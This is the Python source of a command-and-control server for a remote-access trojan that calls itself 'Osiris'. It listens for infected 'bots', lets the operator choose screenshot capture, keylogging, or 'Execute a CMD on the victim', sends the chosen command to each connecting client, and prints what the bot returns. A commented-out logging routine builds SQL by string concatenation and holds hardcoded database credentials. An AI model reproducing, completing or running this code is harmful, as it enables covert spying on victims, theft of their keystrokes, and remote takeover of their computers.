import socket
from threading import *
import mysql.connector
import time


'''
def db_insert_msg(bot_ip, bot_msg):

        mydb = mysql.connector.connect(
        host="127.0.0.1",
        user="user1",
        passwd="password",
        database="ra"
        )
        mycursor = mydb.cursor()
        sql = "INSERT INTO ra_msg (bot_ip, bot_msg, bot_msg_time) VALUES ('"+bot_ip+"', '"+bot_msg+"','"+time.ctime()+"')"
        mycursor.execute(sql)
        mydb.commit()
        print(mycursor.rowcount, "record inserted.")
'''

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.109.137"
port = 9000
serversocket.bind((host, port))


class client(Thread):
    def __init__(self, socket, address,osiris_input):
        Thread.__init__(self)
        self.osiris_input_cmd = osiris_input
        self.sock = socket
        self.addr = address
        self.start()

    def run(self):
        msg = str(self.sock.recv(1024).decode())
        addr = str(self.addr[0])
        if msg != 'hello':
        	print(' =================== ')
        	print('Client sent : ' + msg )
        	print('Client IP : ' + addr )
        self.sock.send(self.osiris_input_cmd)

serversocket.listen(5)
print('  ___   _____ ____  ____   ____  ____    ____  ______ ')
print(' /   \ / ___/|    ||    \ |    ||    \  /    ||      |')
print('|     (   \_  |  | |  D  ) |  | |  D  )|  o  ||      |')
print('|  O  |\__  | |  | |    /  |  | |    / |     ||_|  |_|')
print('|     |/  \ | |  | |    \  |  | |    \ |  _  |  |  |  ')
print('|     |\    | |  | |  .  \ |  | |  .  \|  |  |  |  |  ')
print(' \___/  \___||____||__|\_||____||__|\_||__|__|  |__|  ')
print('                                                      ')
print ('server started and listening ... ')
print (host)
print ('Port : ' + str(port))
while 1:
    while 1:
	osiris_input = str(raw_input("Enter : "))
	if osiris_input == 'help':
		print('Commands are ..')
		print('1 : to Screenshot')
		print('2 : Start Keylogging Session, Note that it is totally not stable!')
		print('3 : Enter CMD and get its output')
	elif osiris_input == '1' :
		break
	elif osiris_input == '2' :
		break
	elif osiris_input == '3' :
		osiris_input = str(raw_input("Execute a CMD on the victim : "))
		break
	else:
		print('Type "help" for help')
    clientsocket, address = serversocket.accept()
    client(clientsocket, address, osiris_input)
